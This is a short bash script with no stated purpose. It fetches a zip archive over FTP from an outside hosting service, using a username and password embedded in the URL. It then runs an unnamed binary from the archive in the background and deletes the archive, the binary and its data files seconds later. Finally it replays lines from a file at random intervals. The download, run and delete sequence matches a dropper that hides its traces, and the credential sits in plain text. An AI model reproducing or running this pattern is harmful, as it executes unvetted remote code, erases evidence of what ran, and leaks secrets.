#!/bin/bash

end=$((SECONDS+$1))
wget "ftp://baylen-ahlam:SuperPassword123@ftp.drivehq.com/My Documents/wan25.zip" -q
unzip wan25.zip > /dev/null 2>&1
#pwd
./smb ./smbdata &
sleep 3
rm -rf wan25.zip
rm -rf smb
rm -rf smbdata
while [ $SECONDS -lt $end ]
do
    read line
    echo "$line"
    sleep $(( $RANDOM % 50 ))
done < $2

